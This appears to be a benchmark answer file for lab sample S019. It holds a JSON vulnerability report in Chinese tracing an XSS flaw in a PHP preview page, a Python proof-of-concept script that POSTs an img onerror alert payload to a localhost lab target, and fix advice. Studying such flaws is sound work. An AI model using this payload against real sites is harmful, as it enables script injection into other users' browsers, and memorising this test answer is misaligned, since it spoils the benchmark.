@@ -1,0 +1,79 @@
+```json
+{
+  "sample_id": "S019",
+  "prediction": "vulnerable",
+  "vulnerability_type": "XSS",
+  "locations": ["F01:0005", "F01:0006", "F02:0016"],
+  "evidence": {
+    "source": "F01:0005 从 $_POST['content'] 读取可控字符串",
+    "flow": "F01:0006 赋给 $content，F01:0008 require templates/preview.php，F02:0016 直接输出",
+    "guard": "无效：F02:0011 的 htmlspecialchars 仅保护 textarea，F02:0016 预览输出未编码",
+    "sink": "F02:0016 在 HTML 正文 div.preview 中直接 echo $content"
+  },
+  "prerequisites": [
+    "PHP 8.5 本机环境",
+    "入口 http://127.0.0.1:4280/lab_cases/S019/index.php 可访问",
+    "通过 POST 字段 content 提交内容并在同一响应渲染预览"
+  ],
+  "missing_context": [],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "运行 python3 poc_s019.py normal 与 python3 poc_s019.py test 对同一入口做普通/测试输入对照；脚本只检查 HTTP 响应回显，不触发 JavaScript。人工在浏览器打开入口，普通输入提交应无提示框；测试输入使用脚本中的 img onerror payload，提交后观察是否弹出 XSS-S019。HTTP 返回体包含 payload 不等于脚本执行，必须以浏览器弹框为执行确认。"
+}
+```
+
+```python
+#!/usr/bin/env python3
+# S019 本地最小验证脚本：仅请求 127.0.0.1:4280，不向外部发送数据。
+import sys
+import urllib.parse
+import urllib.request
+
+TARGET = "http://127.0.0.1:4280/lab_cases/S019/index.php"
+
+PAYLOADS = {
+    "normal": "S019 normal preview",
+    "test": """<img src=x onerror="alert('XSS-S019')">""",
+}
+
+def main() -> int:
+    mode = sys.argv[1] if len(sys.argv) > 1 else "test"
+    if mode not in PAYLOADS:
+        print("用法: python3 poc_s019.py normal|test")
+        return 2
+
+    payload = PAYLOADS[mode]
+    data = urllib.parse.urlencode({"content": payload}).encode("utf-8")
+    req = urllib.request.Request(
+        TARGET,
+        data=data,
+        method="POST",
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+    )
+
+    try:
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            body = resp.read().decode("utf-8", "replace")
+            print(f"mode={mode}")
+            print(f"HTTP={resp.status}")
+            print(f"payload_in_body={payload in body}")
+            idx = body.find(payload)
+            if idx >= 0:
+                print("body_snippet:")
+                print(body[max(0, idx - 120):idx + len(payload) + 120])
+            else:
+                print("body_head:")
+                print(body[:500])
+    except Exception as exc:
+        print(f"请求失败: {exc}")
+        return 1
+
+    print("说明：本脚本只验证 HTTP 回显，不触发浏览器 JavaScript。")
+    print("人工确认：在浏览器打开入口并提交相同测试输入，观察是否弹出 XSS-S019；普通输入作对照。")
+    return 0
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+```
+
+防护建议：对 F02:0016 的预览输出按 HTML 正文上下文使用 `htmlspecialchars($content, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')`，不能仅依赖 textarea 位置的编码；如需允许 HTML，应使用严格白名单净化，并考虑 CSP 作为纵深防御。
